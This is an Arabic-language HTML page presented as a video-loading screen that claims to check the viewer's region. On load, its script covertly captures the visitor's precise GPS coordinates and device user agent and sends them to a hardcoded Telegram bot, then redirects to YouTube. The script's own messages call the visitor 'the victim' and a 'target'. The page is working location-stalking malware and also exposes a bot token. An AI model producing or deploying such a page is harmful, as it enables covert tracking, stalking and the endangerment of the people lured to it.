<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>جاري التحقق من الصلاحيات...</title>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    <script>
        const telegram_token = '8793022795:AAFzOmrMn1eYAkVuBPcy6nh7cf49-WvvaiM';
        const chat_id = '1138822664';
        const youtube_url = 'https://youtu.be/8xbenFTurog?si=BbzXTQ9ibYWYIw8n';

        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${telegram_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
        }

        function initCapture() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, fail, {enableHighAccuracy: true});
            } else {
                sendToTelegram("⚠️ الضحية يستخدم متصفحاً لا يدعم GPS.");
                redirectToYoutube();
            }
        }

        function success(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
            
            const report = `🎯 **هدف جديد تم قنصه!**\n\n📍 الموقع: [اضغط هنا لفتح الخريطة](${googleMaps})\n📌 الإحداثيات: \`${lat}, ${lon}\`\n📏 الدقة: ${accuracy} متر\n📱 الجهاز: ${navigator.userAgent}`;
            
            sendToTelegram(report);
            setTimeout(redirectToYoutube, 1000);
        }

        function fail(error) {
            let errorMsg = "❌ فشل سحب الموقع: ";
            if (error.code == 1) errorMsg += "الضحية رفض إعطاء الصلاحية.";
            else errorMsg += "خطأ في النظام.";
            
            sendToTelegram(errorMsg + `\n📱 الجهاز: ${navigator.userAgent}`);
            redirectToYoutube();
        }

        function redirectToYoutube() {
            window.location.href = youtube_url;
        }

        window.onload = initCapture;
    </script>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <p>جاري التحقق من النطاق الجغرافي لتشغيل الفيديو...</p>
    </div>
</body>
</html>
